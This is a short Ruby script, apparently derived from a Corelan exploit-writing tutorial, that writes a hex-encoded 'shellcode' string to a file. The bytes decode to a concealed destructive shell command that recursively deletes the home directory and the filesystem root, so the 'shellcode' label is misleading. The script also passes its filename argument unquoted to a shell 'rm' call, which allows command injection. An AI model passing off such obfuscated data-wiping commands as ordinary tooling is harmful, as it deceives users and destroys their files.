#!/usr/bin/env ruby
# This script is based on
# Perl script written by Peter Van Eeckhoutte
# http://www.corelan.be
# This script takes a filename as argument
# will write bytes in \x format to the file 
#
filename = "pveWritebin.rb"
if ARGV.empty?
    puts " usage: #{filename} output filename"
else

    system("rm -f #{ARGV[0]}")
    shellcode = "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20" +
    "\x2F\x2A\x20\x32\x3e\x20\x2f\x64\x65" +
    "\x76\x2f\x6e\x75\x6c\x6c\x20\x26"

    puts  "Writing to #{ARGV[0]}"
    File.open("#{ARGV[0]}", 'wb'){|f| f.write(shellcode)}
    puts "Wrote #{shellcode.size} bytes to file"
end